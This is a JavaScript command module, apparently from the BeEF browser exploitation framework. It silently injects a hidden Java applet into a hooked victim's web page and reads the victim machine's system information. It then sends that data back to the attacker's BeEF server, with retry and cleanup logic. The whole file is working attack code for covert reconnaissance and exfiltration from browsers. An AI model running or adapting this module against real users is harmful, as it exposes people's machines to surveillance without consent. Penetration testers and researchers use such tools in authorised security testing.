//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var internal_counter = 0;
	var output;
	var content = "<APPLET code='getSystemInfo' codebase='http://"+beef.net.host+":"+beef.net.port+"/' width=0 height=0 id=getSystemInfo name=getSystemInfo></APPLET>";
	$j('body').append(content);

	if (beef.browser.isFF()) {

		output = document.getSystemInfo.getInfo();
		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br />"));

	} else {

		function waituntilok() {
			try {
				output = document.getSystemInfo.getInfo();
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br />"));
				$j('#getSystemInfo').detach();
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > 30) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=time out');
					$j('#getSystemInfo').detach();
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
		}

		setTimeout(function() {waituntilok()},5000);

	}
});

